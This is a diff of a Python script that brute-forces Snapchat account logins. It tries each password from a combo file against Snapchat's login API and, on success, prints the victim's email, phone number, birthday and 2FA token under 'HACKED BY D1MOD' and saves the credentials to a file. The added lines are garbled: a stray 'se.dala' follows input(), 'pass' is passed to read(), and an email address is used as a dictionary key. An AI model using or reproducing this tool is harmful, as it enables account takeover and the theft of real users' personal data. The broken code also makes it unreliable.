@@ -46,12 +46,12 @@ d1mod = input (red_color + '''
 
 
 if d1mod == "1":
-  user = input("USERNAME OF SNAPCHAT => ")
-  flo = input("FILE PASSWORD (COMBO) => ")
+  user = input("USERNAME OF SNAPCHAT => ")se.dala 
+  flo = input("FILE PASSWORD (COMBO) => ") pass
 
   url = "https://gcp.api.snapchat.com/scauth/login"
 
-  password = open(flo).read().splitlines()
+  password = open(flo).read(pass).splitlines()
 
   for password in password:
         payload = "device_check_token=AgAAANPvhhuaz%2F1mEEEWevsRtdMEUNk0%2Bme89vLfv5ZingpyOOkgXXXyjPzYTzWmWSu%2BBYqcD47byirLZ%2B%2B3dJccpF99hWppT7G5xAuU%2By56WpSYsATk5aHhFiWRhhphuRzJwMGv0Yl%2B%2FXDSBUa%2BrnMHGJ1Mv7blI3pPRtq3hdPW6fVKSCpioEfkEEEkfVRzx3y9AClM9AcAAN6YIAIcDQga3CWYT8LNDXocz2Gcca2O3Tp24wW9jFTgqQfWOcFy0GZSDl%2B%2FPJF7Cr4xGHYB517e9RL0lhJ%2F2NI%2FN91NGZDdCXUqdVFB1cbW%2F9FEEsUxhs8wIsZFXQgDH53f26K7b%2Bpb0P3ERJTjqiGrbATwlO0B%2B9D1fkN%2BMqgf6Pwm1xa9hFJTtXl59BC8gMIv2q1Z2HeEkWrRduomNUtLJwBMNJG%2F7r64%2BdkrAISF420B4t5rUo%2F4R%2BKoYVp%2F8BImIwMdVhf6Gix7qTLNPUzWcSeMqVVzaC7jUZytCGXEXeEf7YqYtr1bRJ6rJs5F87WeWnxJAtrkrTTztusMRxI0MXg8mbUOfoqcO63BSn4nYqedGDzKL5lGHABtYsDruDwrBqwxmLYWT7UuWxg7dW464F4r48hiZMivJ50n24z7jdt5i%2Bvvat4rdh%2FwCobhRFZzeXI2ZAS1d7Az4%2BDFwO1mSsIlYE3KESlfEGGzXj8%2FTy9zFE8KRoPdgoCH1KcZZ6brSB3QfiVJV5cpTa9hwPqOe9AI6k5UNV7aqZ5xMlVTxyha0c4YTD%2FAe7iSjtc1rYBp9iIU7ZV0c95BzK4xakxk9eq3KfJB72lQ2D9khYxcApzOeOgNoxLj4S2JkJiL%2FnaRJUmn7rRZGgFNSbT%2FVck44AyFpZl4XCSPSsc6mA7Wi4tB2NHFu8En5Wv7iO1RxPKwqPwhaqezOGNp0%2FKdd9RrikYOsLgVmlYUH7g1rO6aqbnOsDptJqbdcXaj2jtLyDbxFdgP8V49uXPo2Dgq2u%2BrWeUSDwN8A1JhQuaZUZBTmn%2BJ%2FjwQ0iyq6Sy8c10bbynHSubJpuD4xus%2BAbSaWdCoRA25xt%2Bz6aEQg5upw3sJvHQEGPWo%2BMmIZDyVfl%2BmKejLkro%2BtGPye5VaOJAo8ycgPsGU4VrVVDmhlRp2kI%2BmzI01DVLRc0l0EDC0abGymWjaq9E3ri4taX%2FNzM0QTmyvWV0AQCbMqWEzGKIIJOkn5MeE89MxX0jRVyy9LUjtQKyrJpf6flHD95kfTk06VFNtAVDxMRKW4CyNHtTxEPx75ac2mntaWFmH%2BGwR3F5sztWrOuYu%2B0q%2BGtkbJDfcGl6utTcyOh9SruTM6raBSz35qyOYpskctY5VUth4ZbKE53oHKBusn%2BEHkLRl7RzFjnToHDxfZmmBQNFP9trg3xf4qoE71li3nsO5nUaU93C8HWyFXyC9rf0umJivFqqR8YZeJ3FkLNk4UTXlgP%2FgJ1FgvQcNi0JSrPfiH84%2BaxLT%2BfwcDvOy8m7rWWKe060e3VVAUU62dRSzCyiLac6iItfRpsaV1Ovpd8uiRODTYLhHAWSwukj3GymbymfiPXW1Rl1UDq1HzCpX201aE9b5ZpY9ehhIDRZGXjRCcegJqzpiKRt5z9kHBkj2T%2Fa0MR%2FoeWdPnKdBSvrQBQ6iFce7oPYdoOP5m09IcZ1NFIEgnuyYRG0fDUKefEzwe%2BV3%2BW%2FEWVRB4xXeyiWQ0rWEP75%2FkCj0HxGvX%2BGSUX%2FEXB0ZFpLwMvyNP7VJrojDhOoG1o0PprQaqXRjiC8eo30S9xs6eN3mXqUTkVr0sE%2FDDfT6Ed7H3gJnK%2Fo4EQnKAebW0ns0aeYSyT%2FyhsPi1yieIUURlTp8M9win8PBStYokTH8ibWzsOztHsz1gJVhIFyy9MsaYjHsCz88wEcCdlO35ja1koAQJ7%2BS30D5Ey%2FNukBnD2NdqNMrFT69u3I8PdjAENrI%2BS%2FJcbotC%2B5mSsQwd%2BPXOQaEHnCTYvKHeqLH6S8VFLMMlNmb7bV%2FbUxn5KKhxA76sXw%2BIrIS8MkwKWWnqxD4CdRuqIwGmgdxzCEG7OVZIB9q8aRas6zvovE2XM3ho%2FUlAOHQtj%2FIRYIvcvjdyfE97ItSXazwX5ryWFhVUGeCC2Q9qjA2J1cv%2BeiTcXkK%2BIqN0Rm3%2B780SAu0%2FkqOy8TnQrGtVEZ%2B9xYfvtmfyKhLJshmkXjH12qFpa74QyQPoCIBrx%2FCsK7loN9MJO%2BwNyArOSLRYbLj5pISF75f5uz9bZwEGTHQXaoqonHTwwrX7Zheg%2Buzig4R9bsjMP8r1ztG5JvveDxHKJCfDcQFt0PY7oXPxc%2BauQL3ojLrc%2BSmWWEa9r9s9VEJkACt0E9zwYqNbZHH3448IwFterJpGPMjaqU%2Bt2v8sS0Sv3vg3aHDaVtUn6hOWWKLms0%2FgR1OpIwyq6o7Mjs0cOL88HnzHCAwMGnUCum4WNjUZYfFSFLcmN2rhYLYitrOvln55igXEUWLg6fqahZR4U1EYLDO2guZ1AvjVBxJUwi2OSTXXxu3FGbvUZ4EPHpurxZ4MVAknXCHKqv2Tpt3xNE6ZlR93plDWw%2FPa7uY79O2luYYbioT16YU5cJCP3Ayb3SmKFrZmrse7ComLkYHuLTKuPbH7tUjl5mwfdcHeHN9kVgBAstVs65xP9jqW7%2BOl8g0KW%2BcIOKnYt07xfTCrzb2sVC3S%2F2qTKKOJVR7kYzzEW4BBQD%2B1D8H8o2J0Mueq6e2q0HYWvfgvTPWF5pQb6AFWv3XiFkuHGiQfe9r3R71IEfk6914NcgskSP3RoHZjfTZ1n%2B6Fmys3VZpjRToKQ2w5XwETk4ZDNmkOaR6cNtMFnSlzu1VPahfXR52hNK3LfYoB%2FnZbo%2BEQ4JfG%2BQhvrqqfg8U8KcDDtunJ0cBjXw4Do52kWNdDRWpw56ihS6l&device_id=565264&dsig=1A77189FED6FD8FA1A7D&dtoken1i=00001%3AicHkqkCrQROlzS8NZFzRxGk8Zv%2B6oIgy%2BVJ69ZoT84prkSuT4d4qDKhwNp9OcOXS&fidelius_client_init=%7B%22new_fidelius_version%22%3A9%2C%22hashed_out_betas%22%3A[%22S30kOL6Zt8hUeys3KHu9gMzV%2B1xyss3aTkDqOZJBYvE%3D%22%2C%22QEpHHGn5HQAg9MKh%2FpirjbXGE8moCsZnOpPkBaDiwK0%3D%22%2C%22CmqrfIFS12o1Dpn7DIR2cF2nDw%2BJ7aF4tqIGQpF1BXM%3D%22%2C%220slHDLwDATo8pDeZOrOL6u%2BfaQkXVtNwAc7C95ZKS8s%3D%22]%2C%22new_hashed_out_beta%22%3A%22S30kOL6Zt8hUeys3KHu9gMzV%2B1xyss3aTkDqOZJBYvE%3D%22%2C%22new_iwek%22%3A%22RzF3PcHMBWuWhhaCi8binQu70PGFjui3GS4HGJPY3Ww%3D%22%2C%22new_out_beta%22%3A%22MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE9p8mnnKhEEXMd6mSF1aUsOscVh%2FAM726Nyv4PDJJkTOx1notTouLmdQHJ6Gh5YTTr78pR1P0f%2BwBrKZZL1oXqw%3D%3D%22%7D&from_deeplink=false&height=1334&odlv_pre_auth_token=&password="+password+"&pre_auth_token=&reactivation_confirmed=ho-12x&remember_device=true&req_token=930758537301f9b86e429de7fda39304d0ee4d8d19739a8629b49214d8c51a2b&screen_height_in=0&screen_height_px=667&screen_width_in=0&screen_width_px=375&timestamp=1624302815711&username="+user+"&width=750"
@@ -72,8 +72,8 @@ if d1mod == "1":
         if 'updates_response' in response:
             try:
                 print(red_color+"---------------------------------------")
-                print((green_color + 'username : ' + user + ' | password : ' + password + ' --> FNISH HACKED BY D1MOD '))
-                print(green_color +" --> Email : "+str(info["updates_response"]["email"]))
+                print((green_color + 'username : ' + se.dala + ' | password : ' + password + ' --> FNISH HACKED BY D1MOD '))
+                print(green_color +" --> Email : "+str(info["magicf84@gmail.com"]["email"]))
                 print(green_color +" --> mobile : "+str(info["updates_response"]["mobile"]))
                 print(green_color +" --> birthday : "+str(info["updates_response"]["birthday"]))
                 with open('hacked.txt', 'a') as x:
@@ -84,7 +84,7 @@ if d1mod == "1":
         if 'two_fa_needed' in response:
             try:
                 print(red_color+"---------------------------------------")
-                print((green_color + 'username : ' + user + ' | password : ' + password + ' --> HACKED BY D1MOD -> FUCKING 2FA '))
+                print((green_color + 'username : ' + se.dala + ' | password : ' + password + ' --> HACKED BY D1MOD -> FUCKING 2FA '))
                 print(green_color +" --> number 2FA : "+str(info["is_sms_two_fa_enabled"]))
                 print(green_color +" --> token 2FA : "+str(info["pre_auth_token"]))
                 print(green_color +" --> number 2FA : "+str(info["phone_number"]))
